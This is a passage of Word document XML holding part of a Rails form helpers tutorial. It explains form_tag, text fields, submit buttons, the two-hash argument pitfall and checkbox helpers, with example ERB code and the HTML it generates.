            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="069DF31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form_tag("/search", :method</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "get") do</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7483019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label_tag(:q, "Search for:") %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60E1921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text_field_tag(:q) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48AF57A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submit_tag("Search") %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09C2517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1C66734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This will generate the following HTML:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="742E8C99" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2161736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w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>accept-charset="UTF-8"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>action="/search"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>method="get"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32947BD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&lt;label</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>for="q"&gt;Search for:&lt;/label&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="055F25D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id="q"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="q"</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2E3BA14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name="commit"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="submit"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="Search"</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40A77B3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&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="38D4BC7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For every form input, an ID attribute is generated from its name (“q” in the example). These IDs can be very useful for CSS styling or manipulation of form controls with JavaScript.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544E4CC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Besides </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>text_field_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>submit_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, there is a similar helper for </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>every</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> form control in HTML.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE4A00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Always use “GET” as the method for search forms. This allows users to bookmark a specific search and get back to it. More generally Rails encourages you to use the right HTTP verb for an action.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FDBDA54"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1.2 Multiple Hashes in Form Helper Calls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00537B5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w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper accepts 2 arguments: the path for the action and an options hash. This hash specifies the method of form submission and HTML options such as the form element’s class.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DAEB21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As with the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>link_to</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper, the path argument doesn’t have to be given a string; it can be a hash of URL parameters recognizable by Rails’ routing mechanism, which will turn the hash into a valid URL. However, since both arguments to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> are hashes, you can easily run into a problem if you would like to specify both. For instance, let’s say you write this:</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10A00FEB" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51F3B44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form_tag(:controller</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "people", :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "search", :method</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "get", :class</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "nifty_form")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D58542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=&gt; '&lt;form accept-charset="UTF-8" action="/people/search?method=get&amp;class=nifty_form" method="post"&gt;'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="678F580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Here, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>method</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> are appended to the query string of the generated URL because you even though you mean to write two hashes, you really only specified one. So you need to tell Ruby which is which by delimiting the first hash (or both) with curly brackets. This will generate the HTML you expect:</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61E62906" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="012FE99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form_tag({:controller</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "people", :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "search"}, :method</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "get", :class</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "nifty_form")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26212DC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=&gt; '&lt;form accept-charset="UTF-8" action="/people/search" method="get" class="nifty_form"&gt;'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55C0A894"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1.3 Helpers for Generating Form Elements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B100C6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provides a series of helpers for generating form elements such as checkboxes, text fields, and radio buttons. These basic helpers, with names ending in “_tag” (such as </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>text_field_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>check_box_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">), generate just a single </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;input&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> element. The first parameter to these is always the name of the input. When the form is submitted, the name will be passed along with the form data, and will make its way to the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hash in the controller with the value entered by the user for that field. For example, if the form contains </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;%= text_field_tag(:query) %&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, then you would be able to get the value of this field in the controller with </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:query]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B7E48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When naming inputs, Rails uses certain conventions that make it possible to submit parameters with non-scalar values such as arrays or hashes, which will also be accessible in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You can read more about them in </w:t>
      </w:r>
      <w:hyperlink r:id="rId297" w:anchor="understanding-parameter-naming-conventions" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>chapter 7 of this guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. For details on the precise usage of these helpers, please refer to the </w:t>
      </w:r>
      <w:hyperlink r:id="rId298" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>API documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C77346" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>1.3.1 Checkboxes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9E28E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Checkboxes are form controls that give the user a set of options they can enable or disable:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5A97C399" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1A943C6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check_box_tag(:pet_dog) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43DCFE8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label_tag(:pet_dog, "I own a dog") %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="101D37B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check_box_tag(:pet_cat) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BF03E6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label_tag(:pet_cat, "I own a cat") %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0B37A2E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This generates the following:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="17D70745" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7071DF2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id="pet_dog"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
